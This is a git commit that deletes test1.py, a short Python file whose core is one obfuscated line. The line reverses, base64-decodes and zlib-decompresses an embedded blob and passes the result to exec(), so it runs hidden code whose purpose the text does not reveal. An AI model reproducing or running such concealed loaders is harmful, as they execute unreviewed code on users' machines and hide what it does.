b00da8cf2985d3faa8b1c370ea9745b5b18df082
Kowalskiu <146572613+Kowalskiu@users.noreply.github.com>
2025-08-17 19:11:49 +0300

    Delete test1.py

--- test1.py
+++
@@ -1,4 +0,0 @@
-__version__ = (14, 1, 2)
-_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); exec(_(b'=8lXA8MAfgEFyNAHAeCE1i4OksZYgpvNVWge5laxZmo3lWcJlmVpeZXqpkfy2YXS6bjCW1yycC4WXqQvFqOZ1i3qEoyBvxZFCYjLVMVBD/OfxLKWC8Kf7H7eY7l9XIYgb0TCHOcSqxvWt5x2Nfo15Pea0ynat5xCLnMAXO3R+7Y/hvjW+Y5U5f43S9HM7LbSzyJe'))
-# meta author: @Kowalskiu
-# meta developer: @Kowalskiu
